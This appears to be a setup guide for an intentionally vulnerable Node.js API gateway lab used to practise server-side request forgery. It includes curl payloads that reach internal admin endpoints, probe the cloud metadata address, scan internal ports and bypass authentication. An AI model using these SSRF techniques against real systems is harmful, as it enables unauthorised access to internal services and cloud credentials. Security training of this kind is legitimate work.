# Local Deployment Guide - Lab 03: Node.js API Gateway

## Quick Start with Docker (Recommended)

The fastest way to get the lab running is using Docker Compose:

```bash
cd labs/lab-03-nodejs-gateway
docker-compose up -d
```

This will start all services at:
- **API Gateway**: http://localhost:3000
- **Auth Service**: http://localhost:3001  
- **User Service**: http://localhost:3002
- **Admin Service**: http://localhost:3003

## Manual Setup (Alternative)

### Prerequisites
- Node.js 16 or higher
- npm or yarn package manager

### Step 1: Install Dependencies

```bash
cd labs/lab-03-nodejs-gateway
npm install
```

### Step 2: Create Environment File

Create a `.env` file in the project root:

```bash
NODE_ENV=development
PORT=3000
AUTH_SERVICE_PORT=3001
USER_SERVICE_PORT=3002
ADMIN_SERVICE_PORT=3003
DATABASE_PATH=./data/gateway.db
LOG_LEVEL=debug
```

### Step 3: Initialize Database

```bash
npm run db:init
```

### Step 4: Start All Services

```bash
# Start all services concurrently
npm run dev
```

Or start individual services in separate terminals:

```bash
# Terminal 1 - Gateway
npm run start:gateway

# Terminal 2 - Auth Service  
npm run start:auth

# Terminal 3 - User Service
npm run start:users

# Terminal 4 - Admin Service
npm run start:admin
```

## Testing the Application

### 1. Health Check

```bash
curl http://localhost:3000/
```

Expected response:
```json
{
  "name": "API Gateway - SSRF Lab",
  "version": "1.0.0",
  "vulnerabilities": ["SSRF", "Open Proxy", "Internal Service Access"],
  "warning": "🚨 This application contains intentional security vulnerabilities"
}
```

### 2. Service Discovery

```bash
curl http://localhost:3000/api/services
```

### 3. Test SSRF Vulnerabilities

#### Webhook SSRF:
```bash
curl -X POST http://localhost:3000/api/webhook/notify \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:3003/admin/stats",
    "data": {}
  }'
```

#### Fetch SSRF:
```bash
curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:3001/auth/verify"
```

#### Proxy SSRF:
```bash
curl "http://localhost:3000/api/proxy/http://127.0.0.1:3003/admin/config"
```

## Troubleshooting

### Port Conflicts

If you get port in use errors:

```bash
# Kill processes on required ports
kill $(lsof -t -i:3000)
kill $(lsof -t -i:3001)  
kill $(lsof -t -i:3002)
kill $(lsof -t -i:3003)
```

### Database Issues

Reset the database if needed:

```bash
rm -rf ./data/
npm run db:init
```

### Service Connection Issues

Check if all services are running:

```bash
curl http://localhost:3000/api/health/all
```

## SSRF Attack Examples

### 1. Cloud Metadata Access

```bash
# Try to access AWS metadata (will fail in local environment)
curl -X POST http://localhost:3000/api/webhook/notify \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/",
    "data": {}
  }'
```

### 2. Internal Network Scanning

```bash
# Scan internal services
curl "http://localhost:3000/api/scan/internal?range=127.0.0.1&ports=3000,3001,3002,3003"
```

### 3. Bypass Authentication

```bash
# Access admin endpoints via SSRF
curl "http://localhost:3000/api/proxy/http://127.0.0.1:3003/admin/debug"
```

## Docker Compose Services

The `docker-compose.yml` includes:
- **gateway**: Main API Gateway service
- **auth-service**: Authentication service  
- **user-service**: User management service
- **admin-service**: Administrative service

All services share a network and can communicate internally.

## Stopping the Lab

### Docker:
```bash
docker-compose down
```

### Manual:
Stop all running Node.js processes with `Ctrl+C` in each terminal.

## Log Files

Application logs are written to:
- Console output (stdout)
- `./logs/gateway.log` (if configured)
- Database logs in `./data/gateway.db`

## Security Testing Notes

This lab environment is intentionally vulnerable. Key security issues:
- No URL validation in SSRF endpoints
- Internal services accessible via proxy
- Admin endpoints exposed through gateway
- No rate limiting on dangerous operations
- Detailed error messages expose internal information

Use this environment to practice:
- SSRF attack techniques
- Internal network enumeration
- Service discovery attacks
- Bypass techniques for security controls
